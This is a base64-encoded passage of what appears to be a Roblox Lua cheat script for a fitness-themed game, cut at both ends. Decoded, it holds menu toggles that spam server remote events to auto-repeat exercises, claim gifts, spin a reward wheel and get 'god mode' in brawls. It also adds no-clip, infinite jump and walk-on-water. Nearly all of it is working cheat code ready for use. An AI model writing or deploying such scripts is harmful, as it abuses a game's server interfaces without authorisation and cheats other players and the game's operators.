dXBzIikKICAgICAgICAgICAgICAgICAgICBpZiBlcXVpcHBlZDpGaW5kRmlyc3RDaGlsZCgicmVwVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZXF1aXBwZWQucmVwVGltZS5WYWx1ZSA9IDAKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3YWl0KDAuMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgIC0tIEF1dG8gZG8gcHVzaHVwcwogICAgICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgX0cuRmFzdFB1c2h1cHMgZG8KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIC0tIFVuZXF1aXAgYW5kIHJlc2V0IHRvb2wKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgZXF1aXBwZWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1c2h1cHMiKQogICAgICAgIGlmIGVxdWlwcGVkIHRoZW4KICAgICAgICAgICAgaWYgZXF1aXBwZWQ6RmluZEZpcnN0Q2hpbGQoInJlcFRpbWUiKSB0aGVuCiAgICAgICAgICAgICAgICBlcXVpcHBlZC5yZXBUaW1lLlZhbHVlID0gMQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgZXF1aXBwZWQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gQWxzbyByZXNldCB0aGUgYmFja3BhY2sgdG9vbAogICAgICAgIGxvY2FsIGJhY2twYWNrVG9vbCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVzaHVwcyIpCiAgICAgICAgaWYgYmFja3BhY2tUb29sIGFuZCBiYWNrcGFja1Rvb2w6RmluZEZpcnN0Q2hpbGQoInJlcFRpbWUiKSB0aGVuCiAgICAgICAgICAgIGJhY2twYWNrVG9vbC5yZXBUaW1lLlZhbHVlID0gMQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCi0tIEZhc3QgSGFuZHN0YW5kcyB0b2dnbGUgd2l0aCBhdXRvLWhhbmRzdGFuZHMgZnVuY3Rpb25hbGl0eSBhbmQgcGVyc2lzdGVudCBlcXVpcHBpbmcKbWlzYzFGb2xkZXI6QWRkU3dpdGNoKCJBdXRvIEhhbmRzdGFuZHMiLCBmdW5jdGlvbihib29sKQogICAgX0cuRmFzdEhhbmRzdGFuZHMgPSBib29sCiAgICAKICAgIGlmIGJvb2wgdGhlbgogICAgICAgIC0tIENvbnRpbnVvdXNseSBlcXVpcCBhbmQgbW9kaWZ5IGhhbmRzdGFuZHMgdG9vbAogICAgICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgX0cuRmFzdEhhbmRzdGFuZHMgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBDaGVjayBpZiB0b29sIGlzIG5vdCBlcXVpcHBlZAogICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCBub3QgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIYW5kc3RhbmRzIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhhbmRzdGFuZHNUb29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJIYW5kc3RhbmRzIikKICAgICAgICAgICAgICAgICAgICBpZiBoYW5kc3RhbmRzVG9vbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGhhbmRzdGFuZHNUb29sOkZpbmRGaXJzdENoaWxkKCJyZXBUaW1lIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGFuZHN0YW5kc1Rvb2wucmVwVGltZS5WYWx1ZSA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woaGFuZHN0YW5kc1Rvb2wpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlaWYgY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhhbmRzdGFuZHMiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgLS0gTWFrZSBzdXJlIGVxdWlwcGVkIHRvb2wgaXMgbW9kaWZpZWQKICAgICAgICAgICAgICAgICAgICBsb2NhbCBlcXVpcHBlZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGFuZHN0YW5kcyIpCiAgICAgICAgICAgICAgICAgICAgaWYgZXF1aXBwZWQ6RmluZEZpcnN0Q2hpbGQoInJlcFRpbWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGVxdWlwcGVkLnJlcFRpbWUuVmFsdWUgPSAwCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICAKICAgICAgICAtLSBBdXRvIGRvIGhhbmRzdGFuZHMKICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLkZhc3RIYW5kc3RhbmRzIGRvCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVsc2UKICAgICAgICAtLSBVbmVxdWlwIGFuZCByZXNldCB0b29sCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIGVxdWlwcGVkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIYW5kc3RhbmRzIikKICAgICAgICBpZiBlcXVpcHBlZCB0aGVuCiAgICAgICAgICAgIGlmIGVxdWlwcGVkOkZpbmRGaXJzdENoaWxkKCJyZXBUaW1lIikgdGhlbgogICAgICAgICAgICAgICAgZXF1aXBwZWQucmVwVGltZS5WYWx1ZSA9IDEKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVxdWlwcGVkLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIEFsc28gcmVzZXQgdGhlIGJhY2twYWNrIHRvb2wKICAgICAgICBsb2NhbCBiYWNrcGFja1Rvb2wgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkhhbmRzdGFuZHMiKQogICAgICAgIGlmIGJhY2twYWNrVG9vbCBhbmQgYmFja3BhY2tUb29sOkZpbmRGaXJzdENoaWxkKCJyZXBUaW1lIikgdGhlbgogICAgICAgICAgICBiYWNrcGFja1Rvb2wucmVwVGltZS5WYWx1ZSA9IDEKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgotLSBDcmVhdGUgdGhlIGZpcnN0IGZvbGRlcgpsb2NhbCBtaXNjMkZvbGRlciA9IG1pc2NUYWI6QWRkRm9sZGVyKCJNaXNjIDIiKQoKLS0gQWRkIEF1dG8gU3BpbiBXaGVlbCB0b2dnbGUKbWlzYzJGb2xkZXI6QWRkU3dpdGNoKCJBdXRvIFNwaW4gV2hlZWwiLCBmdW5jdGlvbihib29sKQogICAgX0cuQXV0b1NwaW5XaGVlbCA9IGJvb2wKICAgIAogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5BdXRvU3BpbldoZWVsIGFuZCB3YWl0KDEpIGRvCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5vcGVuRm9ydHVuZVdoZWVsUmVtb3RlOkludm9rZVNlcnZlcigib3BlbkZvcnR1bmVXaGVlbCIsIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5mb3J0dW5lV2hlZWxDaGFuY2VzWyJGb3J0dW5lIFdoZWVsIl0pCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAplbmQpCgotLSBBZGQgQXV0byBDbGFpbSBHaWZ0cyB0b2dnbGUKbWlzYzJGb2xkZXI6QWRkU3dpdGNoKCJBdXRvIENsYWltIEdpZnRzIiwgZnVuY3Rpb24oYm9vbCkKICAgIF9HLkF1dG9DbGFpbUdpZnRzID0gYm9vbAogICAgCiAgICBpZiBib29sIHRoZW4KICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLkF1dG9DbGFpbUdpZnRzIGFuZCB3YWl0KDEpIGRvCiAgICAgICAgICAgICAgICBmb3IgaSA9IDEsIDggZG8KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5mcmVlR2lmdENsYWltUmVtb3RlOkludm9rZVNlcnZlcigiY2xhaW1HaWZ0IiwgaSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKLS0gQWRkIHBvc2l0aW9uIGxvY2sgdG9nZ2xlCm1pc2MyRm9sZGVyOkFkZFN3aXRjaCgiTG9jayBQb3NpdGlvbiIsIGZ1bmN0aW9uKGJvb2wpCiAgICBpZiBib29sIHRoZW4KICAgICAgICAtLSBHZXQgY3VycmVudCBwb3NpdGlvbiBhbmQgbG9jayBpdAogICAgICAgIGlmIHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgIGxvY2FsIGN1cnJlbnRQb3NpdGlvbiA9IHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICAgICAgbG9ja1BsYXllclBvc2l0aW9uKGN1cnJlbnRQb3NpdGlvbikKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICAtLSBVbmxvY2sgcG9zaXRpb24KICAgICAgICB1bmxvY2tQbGF5ZXJQb3NpdGlvbigpCiAgICBlbmQKZW5kKQoKbG9jYWwgZnJhbWVUb2dnbGUgPSBtaXNjMkZvbGRlcjpBZGRTd2l0Y2goIkhpZGUgRnJhbWVzIiwgZnVuY3Rpb24oYm9vbCkKICAgIGxvY2FsIHJTdG8gPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKICAgIGZvciBfLCBvYmogaW4gcGFpcnMoclN0bzpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIG9iai5OYW1lOm1hdGNoKCJGcmFtZSQiKSB0aGVuCiAgICAgICAgICAgIG9iai5WaXNpYmxlID0gbm90IGJvb2wKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgotLSBBdXRvIEVhdCBFZ2dzIEZlYXR1cmUKbWlzYzJGb2xkZXI6QWRkU3dpdGNoKCJBdXRvIEVhdCBFZ2dzIiwgZnVuY3Rpb24oZW5hYmxlZCkKICAgIF9HLkF1dG9FZ2cgPSBlbmFibGVkCiAgICBpZiBlbmFibGVkIHRoZW4KICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgX0cuQXV0b0VnZyBkbwogICAgICAgICAgICAgICAgbG9jYWwgcHJvdGVpbkVnZyA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHJvdGVpbiBFZ2ciKQogICAgICAgICAgICAgICAgaWYgcHJvdGVpbkVnZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgcHJvdGVpbkVnZy5QYXJlbnQgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgPSAxLCA1IGRvCiAgICAgICAgICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZE1vdXNlQnV0dG9uRXZlbnQoMCwgMCwgMCwgdHJ1ZSwgZ2FtZSwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kTW91c2VCdXR0b25FdmVudCgwLCAwLCAwLCBmYWxzZSwgZ2FtZSwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAplbmQpCgotLSBBdXRvIEVhdCBUcm9waWNhbCBTaGFrZSAoUGluZWFwcGxlKSBGZWF0dXJlCm1pc2MyRm9sZGVyOkFkZFN3aXRjaCgiQXV0byBFYXQgUGluZWFwcGxlIiwgZnVuY3Rpb24oZW5hYmxlZCkKICAgIF9HLkF1dG9QaW5lYXBwbGUgPSBlbmFibGVkCiAgICBpZiBlbmFibGVkIHRoZW4KICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgX0cuQXV0b1BpbmVhcHBsZSBkbwogICAgICAgICAgICAgICAgbG9jYWwgdHJvcGljYWxTaGFrZSA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiVHJvcGljYWwgU2hha2UiKQogICAgICAgICAgICAgICAgaWYgdHJvcGljYWxTaGFrZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdHJvcGljYWxTaGFrZS5QYXJlbnQgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgIGZvciBpID0gMSwgNSBkbwogICAgICAgICAgICAgICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRNb3VzZUJ1dHRvbkV2ZW50KDAsIDAsIDAsIHRydWUsIGdhbWUsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZE1vdXNlQnV0dG9uRXZlbnQoMCwgMCwgMCwgZmFsc2UsIGdhbWUsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKbWlzYzJGb2xkZXI6QWRkU3dpdGNoKCJIaWRlIFBldHMiLCBmdW5jdGlvbihTdGF0ZSkKICAgIGlmIFN0YXRlIHRoZW4KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5zaG93UGV0c0V2ZW50OkZpcmVTZXJ2ZXIoImhpZGVQZXRzIikKICAgIGVsc2UKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5zaG93UGV0c0V2ZW50OkZpcmVTZXJ2ZXIoInNob3dQZXRzIikKICAgIGVuZAplbmQpCgoKbWlzYzJGb2xkZXI6QWRkU3dpdGNoKCJVbmFibGUgVHJhZGUiLCBmdW5jdGlvbihTdGF0ZSkKICAgIGlmIFN0YXRlIHRoZW4KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy50cmFkaW5nRXZlbnQ6RmlyZVNlcnZlcigiZGlzYWJsZVRyYWRpbmciKQogICAgZWxzZQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLnRyYWRpbmdFdmVudDpGaXJlU2VydmVyKCJlbmFibGVUcmFkaW5nIikKICAgIGVuZAplbmQpCgoKLS0gQ3JlYXRlIHRoZSBmaXJzdCBmb2xkZXIKbG9jYWwgbWlzYzNGb2xkZXIgPSBtaXNjVGFiOkFkZEZvbGRlcigiTWlzYyAzIikKCmxvY2FsIGdvZE1vZGVUb2dnbGUgPSBmYWxzZQptaXNjM0ZvbGRlcjpBZGRTd2l0Y2goIkdvZCBNb2RlIChCcmF3bCkiLCBmdW5jdGlvbihTdGF0ZSkKICAgIGdvZE1vZGVUb2dnbGUgPSBTdGF0ZQogICAgaWYgU3RhdGUgdGhlbgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBnb2RNb2RlVG9nZ2xlIGRvCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5icmF3bEV2ZW50OkZpcmVTZXJ2ZXIoImpvaW5CcmF3bCIpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZCkKCmxvY2FsIGF1dG9Kb2luVG9nZ2xlID0gZmFsc2UKbWlzYzNGb2xkZXI6QWRkU3dpdGNoKCJBdXRvIEpvaW4gQnJhd2wiLCBmdW5jdGlvbihTdGF0ZSkKICAgIGF1dG9Kb2luVG9nZ2xlID0gU3RhdGUKICAgIGlmIFN0YXRlIHRoZW4KICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgYXV0b0pvaW5Ub2dnbGUgZG8KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmJyYXdsRXZlbnQ6RmlyZVNlcnZlcigiam9pbkJyYXdsIikKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgyKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKLS0gV2FsayBvbiBXYXRlciBmZWF0dXJlCmxvY2FsIHBhcnRzID0ge30KbG9jYWwgcGFydFNpemUgPSAyMDQ4CmxvY2FsIHRvdGFsRGlzdGFuY2UgPSA1MDAwMApsb2NhbCBzdGFydFBvc2l0aW9uID0gVmVjdG9yMy5uZXcoLTIsIC05LjUsIC0yKQpsb2NhbCBudW1iZXJPZlBhcnRzID0gbWF0aC5jZWlsKHRvdGFsRGlzdGFuY2UgLyBwYXJ0U2l6ZSkKCmxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVBhcnRzKCkKICAgIGZvciB4ID0gMCwgbnVtYmVyT2ZQYXJ0cyAtIDEgZG8KICAgICAgICBmb3IgeiA9IDAsIG51bWJlck9mUGFydHMgLSAxIGRvCiAgICAgICAgICAgIGxvY2FsIG5ld1BhcnRTaWRlID0gSW5zdGFuY2UubmV3KCJQYXJ0IikKICAgICAgICAgICAgbmV3UGFydFNpZGUuU2l6ZSA9IFZlY3RvcjMubmV3KHBhcnRTaXplLCAxLCBwYXJ0U2l6ZSkKICAgICAgICAgICAgbmV3UGFydFNpZGUuUG9zaXRpb24gPSBzdGFydFBvc2l0aW9uICsgVmVjdG9yMy5uZXcoeCAqIHBhcnRTaXplLCAwLCB6ICogcGFydFNpemUpCiAgICAgICAgICAgIG5ld1BhcnRTaWRlLkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICBuZXdQYXJ0U2lkZS5UcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgIG5ld1BhcnRTaWRlLkNhbkNvbGxpZGUgPSB0cnVlCiAgICAgICAgICAgIG5ld1BhcnRTaWRlLk5hbWUgPSAiUGFydF9TaWRlXyIgLi4geCAuLiAiXyIgLi4gegogICAgICAgICAgICBuZXdQYXJ0U2lkZS5QYXJlbnQgPSB3b3Jrc3BhY2UKICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHBhcnRzLCBuZXdQYXJ0U2lkZSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIG5ld1BhcnRMZWZ0UmlnaHQgPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQogICAgICAgICAgICBuZXdQYXJ0TGVmdFJpZ2h0LlNpemUgPSBWZWN0b3IzLm5ldyhwYXJ0U2l6ZSwgMSwgcGFydFNpemUpCiAgICAgICAgICAgIG5ld1BhcnRMZWZ0UmlnaHQuUG9zaXRpb24gPSBzdGFydFBvc2l0aW9uICsgVmVjdG9yMy5uZXcoLXggKiBwYXJ0U2l6ZSwgMCwgeiAqIHBhcnRTaXplKQogICAgICAgICAgICBuZXdQYXJ0TGVmdFJpZ2h0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICBuZXdQYXJ0TGVmdFJpZ2h0LlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgbmV3UGFydExlZnRSaWdodC5DYW5Db2xsaWRlID0gdHJ1ZQogICAgICAgICAgICBuZXdQYXJ0TGVmdFJpZ2h0Lk5hbWUgPSAiUGFydF9MZWZ0UmlnaHRfIiAuLiB4IC4uICJfIiAuLiB6CiAgICAgICAgICAgIG5ld1BhcnRMZWZ0UmlnaHQuUGFyZW50ID0gd29ya3NwYWNlCiAgICAgICAgICAgIHRhYmxlLmluc2VydChwYXJ0cywgbmV3UGFydExlZnRSaWdodCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIG5ld1BhcnRVcExlZnQgPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQogICAgICAgICAgICBuZXdQYXJ0VXBMZWZ0LlNpemUgPSBWZWN0b3IzLm5ldyhwYXJ0U2l6ZSwgMSwgcGFydFNpemUpCiAgICAgICAgICAgIG5ld1BhcnRVcExlZnQuUG9zaXRpb24gPSBzdGFydFBvc2l0aW9uICsgVmVjdG9yMy5uZXcoLXggKiBwYXJ0U2l6ZSwgMCwgLXogKiBwYXJ0U2l6ZSkKICAgICAgICAgICAgbmV3UGFydFVwTGVmdC5BbmNob3JlZCA9IHRydWUKICAgICAgICAgICAgbmV3UGFydFVwTGVmdC5UcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgIG5ld1BhcnRVcExlZnQuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgbmV3UGFydFVwTGVmdC5OYW1lID0gIlBhcnRfVXBMZWZ0XyIgLi4geCAuLiAiXyIgLi4gegogICAgICAgICAgICBuZXdQYXJ0VXBMZWZ0LlBhcmVudCA9IHdvcmtzcGFjZQogICAgICAgICAgICB0YWJsZS5pbnNlcnQocGFydHMsIG5ld1BhcnRVcExlZnQpCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBuZXdQYXJ0VXBSaWdodCA9IEluc3RhbmNlLm5ldygiUGFydCIpCiAgICAgICAgICAgIG5ld1BhcnRVcFJpZ2h0LlNpemUgPSBWZWN0b3IzLm5ldyhwYXJ0U2l6ZSwgMSwgcGFydFNpemUpCiAgICAgICAgICAgIG5ld1BhcnRVcFJpZ2h0LlBvc2l0aW9uID0gc3RhcnRQb3NpdGlvbiArIFZlY3RvcjMubmV3KHggKiBwYXJ0U2l6ZSwgMCwgLXogKiBwYXJ0U2l6ZSkKICAgICAgICAgICAgbmV3UGFydFVwUmlnaHQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgIG5ld1BhcnRVcFJpZ2h0LlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgbmV3UGFydFVwUmlnaHQuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgbmV3UGFydFVwUmlnaHQuTmFtZSA9ICJQYXJ0X1VwUmlnaHRfIiAuLiB4IC4uICJfIiAuLiB6CiAgICAgICAgICAgIG5ld1BhcnRVcFJpZ2h0LlBhcmVudCA9IHdvcmtzcGFjZQogICAgICAgICAgICB0YWJsZS5pbnNlcnQocGFydHMsIG5ld1BhcnRVcFJpZ2h0KQogICAgICAgIGVuZAogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gbWFrZVBhcnRzV2Fsa3Rocm91Z2goKQogICAgZm9yIF8sIHBhcnQgaW4gaXBhaXJzKHBhcnRzKSBkbwogICAgICAgIGlmIHBhcnQgYW5kIHBhcnQuUGFyZW50IHRoZW4KICAgICAgICAgICAgcGFydC5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIG1ha2VQYXJ0c1NvbGlkKCkKICAgIGZvciBfLCBwYXJ0IGluIGlwYWlycyhwYXJ0cykgZG8KICAgICAgICBpZiBwYXJ0IGFuZCBwYXJ0LlBhcmVudCB0aGVuCiAgICAgICAgICAgIHBhcnQuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICBlbmQKICAgIGVuZAplbmQKCi0tIEFkZCBXYWxrIG9uIFdhdGVyIHRvZ2dsZQptaXNjM0ZvbGRlcjpBZGRTd2l0Y2goIldhbGsgb24gV2F0ZXIiLCBmdW5jdGlvbihib29sKQogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgY3JlYXRlUGFydHMoKQogICAgZWxzZQogICAgICAgIG1ha2VQYXJ0c1dhbGt0aHJvdWdoKCkKICAgIGVuZAplbmQpCgotLSBBZGQgTm8tQ2xpcCB0b2dnbGUKbWlzYzNGb2xkZXI6QWRkU3dpdGNoKCJOby1DbGlwIiwgZnVuY3Rpb24oYm9vbCkKICAgIF9HLk5vQ2xpcCA9IGJvb2wKICAgIAogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgbG9jYWwgbm9jbGlwTG9vcAogICAgICAgIG5vY2xpcExvb3AgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5TdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBfRy5Ob0NsaXAgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHBhcnQ6SXNBKCJCYXNlUGFydCIpIGFuZCBwYXJ0LkNhbkNvbGxpZGUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIG5vY2xpcExvb3A6RGlzY29ubmVjdCgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICAKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJOby1DbGlwIiwKICAgICAgICAgICAgVGV4dCA9ICJUYXRhZ29zIGthIGJhIiwKICAgICAgICAgICAgRHVyYXRpb24gPSAwCiAgICAgICAgfSkKICAgIGVuZAplbmQpCgotLSBBZGQgSW5maW5pdGUgSnVtcCB0b2dnbGUKbWlzYzNGb2xkZXI6QWRkU3dpdGNoKCJKdW1weSBJbmZpbml0ZSIsIGZ1bmN0aW9uKGJvb2wpCiAgICBfRy5JbmZpbml0ZUp1bXAgPSBib29sCiAgICAKICAgIGlmIGJvb2wgdGhlbgogICAgICAgIGxvY2FsIEluZmluaXRlSnVtcENvbm5lY3Rpb24KICAgICAgICBJbmZpbml0ZUp1bXBDb25uZWN0aW9uID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikuSnVtcFJlcXVlc3Q6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIF9HLkluZmluaXRlSnVtcCB0aGVuCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpOkNoYW5nZVN0YXRlKCJKdW1waW5nI